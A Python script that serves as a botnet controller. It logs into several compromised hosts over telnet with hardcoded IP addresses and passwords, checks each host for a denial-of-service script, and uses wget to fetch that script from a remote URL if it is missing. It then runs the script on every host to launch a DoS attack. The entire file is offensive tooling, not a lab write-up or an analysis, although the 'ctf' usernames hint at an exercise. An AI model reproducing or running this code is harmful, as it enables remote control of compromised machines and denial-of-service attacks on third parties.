import telnetlib
import time
import re
class Trigger(object):
    def __init__(self):
        pass

    def login(self,Hosts):
        ChickenNum = len(Hosts)
        print('您有肉鸡数量:',ChickenNum)
        devs = []
        for Chiken in Chikens:
            dev = telnetlib.Telnet(Chiken['host'], port=23)

            dev.read_until(b'login:')
            dev.write(Chiken['user'] + b'\n')

            dev.read_until(b'Password:')
            dev.write(Chiken['passwd'] + b'\n')
            dev.read_until(b'$')
            print("肉鸡",str(Chiken['host'],encoding='utf-8'),"登录成功!")
            print("用户名:",str(Chiken['user'],encoding='utf-8'), "密码:",str(Chiken['passwd'],encoding='utf-8'))
            devs.append(dev)
        return devs

    def checkIN(self,devs):
        fileisINs = []
        for dev in devs:
            dev.write(b'ls'+b'\n')
            buff = dev.read_until(b'$')
            buff = str(buff,encoding='utf-8')
            matched = re.search(r'\bdos.py\b', buff, re.M)
            if matched:
                fileisIN = True
            else:
                fileisIN = False
            fileisINs.append(fileisIN)
        return fileisINs

    def dosDownLoad(self,devs,path):
        for dev in devs:
            dev.write(b'cd ~' + b'\n')

            dev.read_until(b'$')
            dev.write(b'wget '+ path + b'\n')
            dev.read_until(b'$')

    def dosAction(self,devs):
        i = 1
        for dev in devs:
            print('第',i,'号肉鸡开始执行攻击..........................')
            dev.write(b'python3 dos.py' + b'\n')
            dev.read_until(b'$')
            i = i + 1

    def signout(self,devs):
        i = 1
        for dev in devs:
            telnetlib.Telnet.close(dev)
            print('第', i, '号肉鸡下线.............................')
            i = 1 + 1

if __name__ == '__main__':

    Chikens = [{'host': b'153.0.0.171', 'user':b'ctf','passwd': b'ctff1234'},
            {'host':b'153.0.0.181','user':b'ctf','passwd':b'test1234'}]

    path = b'https://raw.githubusercontent.com/bl201809/bllist/master/dos/dos.py'

    hack = Trigger()
    devs = hack.login(Chikens)
    if not hack.checkIN(devs):
        hack.dosDownLoad(devs,path)
    time.sleep(1)
    hack.dosAction(devs)
    hack.signout(devs)





